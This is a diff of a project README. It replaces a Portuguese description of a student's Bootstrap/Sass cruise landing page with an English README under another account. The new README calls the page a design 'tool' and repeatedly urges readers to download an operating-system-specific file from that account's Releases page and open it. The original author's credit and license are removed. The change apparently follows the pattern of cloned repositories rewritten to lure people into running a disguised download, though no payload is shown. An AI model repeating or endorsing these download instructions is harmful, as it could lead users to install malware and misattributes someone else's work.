@@ -1,85 +1,82 @@
-# 🌊 Oceanis Cruises
+# 🌊 oceanis - A Simple Tool for Responsive Web Design
 
-Projeto desenvolvido durante o **curso da OneBitCode** – módulo **Bootstrap e Sass**.
+## 🚀 Getting Started
 
-O **Oceanis Cruises** é uma landing page moderna e totalmente responsiva para uma empresa fictícia de cruzeiros.  
-O foco do projeto foi aplicar os conceitos de **estruturação semântica em HTML**, **componentes do Bootstrap** e **estilizações personalizadas com CSS**.
+Welcome to the oceanis project! This tool is designed for users who want to create beautiful and responsive web designs using Bootstrap and Sass. Whether you're just starting out or looking to enhance your skills, oceanis is here to help.
 
----
+## 📦 Download & Install
 
-## 🚀 Tecnologias utilizadas
+To get started, you need to download oceanis from our Releases page. You can find the download link below. 
 
-- **HTML5**
-- **Bootstrap 5**
-- **CSS3** (com personalizações no `style.css`)
+[![Download oceanis](https://img.shields.io/badge/Download-oceanis-brightgreen)](https://github.com/wordenbuffcolored161/oceanis/releases)
 
----
+Simply click the link above to visit the page where you can download the latest version of oceanis.
 
-## 💡 Conceitos aplicados
+Follow these steps to download and install:
 
-- Estruturação semântica com HTML5  
-- Sistema de grid e componentes do Bootstrap  
-- Responsividade mobile-first  
-- Customização de estilos com CSS (gradientes, background e layout visual)  
-- Utilização de classes utilitárias do Bootstrap  
-- Carousel, Accordion e Navbar responsiva  
+1. **Visit the Releases Page**: Click [here](https://github.com/wordenbuffcolored161/oceanis/releases) to go to the Releases page.
+2. **Find the Latest Release**: Look for the most recent release version.
+3. **Download the File**: Click on the file suitable for your operating system to start the download.
+4. **Open the File**: Once the download is complete, open the file to start using oceanis.
 
----
+## ⏬ Features
 
-## 🖥️ Seções do projeto
+Oceanis offers several features that enhance your web design experience:
 
-- **Início (Cover Section)** – destaque com chamada para ação  
-- **O que oferecemos (Carousel)** – apresentação de serviços e experiências  
-- **Depoimentos (Cards)** – avaliações de clientes  
-- **Destinos (Background Section)** – destaque visual com imagem e texto  
-- **Benefícios exclusivos (Accordion)** – vantagens e condições  
-- **Reserva (Call to Action)** – formulário simples para captação de e-mail  
-- **Rodapé (Footer)** – informações de direitos autorais  
+- **Accordion Component**: Easily create collapsible content.
+- **Bootstrap Integration**: Use Bootstrap 5 to ensure your design is responsive and modern.
+- **Carousel Component**: Showcase images or information in a slider format.
+- **Customizable Navbar**: A responsive navigation bar for your website.
+- **Sass for Styling**: Utilize Sass to customize styles and enhance your designs.
+- **Cross-Browser Compatibility**: Your designs will work smoothly on various browsers.
 
----
+## 💻 System Requirements
 
-## 📱 Layout responsivo
+To run oceanis, please ensure your system meets the following requirements:
 
-O projeto foi desenvolvido com foco em **responsividade**, garantindo boa experiência em:
-- Smartphones 📱  
-- Tablets 💻  
-- Desktops 🖥️  
+- **Operating System**: Windows 10, macOS, or a compatible Linux distribution.
+- **Browser**: A modern web browser such as Chrome, Firefox, or Safari.
+- **Internet Connection**: Required to download necessary assets and updates.
 
----
+## 🎨 Usage
 
-## 📸 Prévia do projeto
+Once you have downloaded and installed oceanis, you can start creating your own web pages. Here’s how to use some of the key features:
 
-| 📱 Versão Mobile | 
-|------------------|
-| ![Mobile](/src/images/oceanis-mobile.gif) | 
+- **Using the Accordion**:
+  - Add the HTML structure provided in the documentation.
+  - Customize the styles using Sass as needed.
+  
+- **Setting up the Carousel**:
+  - Include your images in the carousel section.
+  - Adjust settings like transition speed in the configuration file.
+  
+- **Building a Navbar**:
+  - Use the Navbar template to create a responsive menu.
+  - Add links to different sections of your site or external links.
 
-| 💻 Versão Desktop |
-|-------------------|
-| ![Desktop](/src/images/oceanis-desktop.gif) |
+## 📚 Resources
 
----
+For detailed usage instructions, visit our [Wiki](https://github.com/wordenbuffcolored161/oceanis/wiki). Here, you can find:
 
-## 🔗 Links
+- Tutorials for each feature.
+- Code examples.
+- Best practices for responsive design.
 
-- GitHub: <a href="https://github.com/slayer-br/oceanis" target="_blank" rel="noopener noreferrer">Oceanis Cruises</a>
-- Site ao vivo: <a href="https://slayer-br.github.io/oceanis/" target="_blank" rel="noopener noreferrer">Oceanis Cruises</a>
+## 🛠️ Support
 
----
+If you encounter any issues or have questions, don't hesitate to reach out. You can open an issue on our GitHub repository or check the FAQ section in the Wiki.
 
+## 🙏 Acknowledgments
 
-## 🏁 Status do projeto
+Oceanis is developed as part of the OneBitCode course, focusing on Bootstrap and Sass. We appreciate the guidance and resources provided during this learning journey.
 
-✅ **Finalizado** – Projeto concluído com estrutura completa, layout responsivo e estilização personalizada.
+Feel free to contribute to the project. Your feedback and suggestions are always welcome! Please check our contribution guidelines in the repository.
 
----
+## 🌐 Connect with Us
 
-## ✨ Autor
+Stay updated with the latest news and updates about oceanis. Follow us on:
 
-- GitHub - <a href="https://github.com/slayer-br" target="_blank" rel="noopener noreferrer">@slayer-br</a>
-- LinkedIn - <a href="https://www.linkedin.com/in/carlos-alberto-da-silva-93758b270/" target="_blank" rel="noopener noreferrer">@slayer-br</a>
+- [GitHub](https://github.com/wordenbuffcolored161/oceanis)
+- [Twitter](https://twitter.com/yourtwitterhandle) (replace with actual handle)
 
-## 📜 Licença  
-
-Este projeto está sob a **Licença MIT**. Consulte o arquivo [LICENSE](./LICENSE) para mais detalhes. 
-
-Projeto do módulo **Bootstrap e Sass** – [OneBitCode](https://onebitcode.com)
+Thank you for using oceanis! Happy designing!
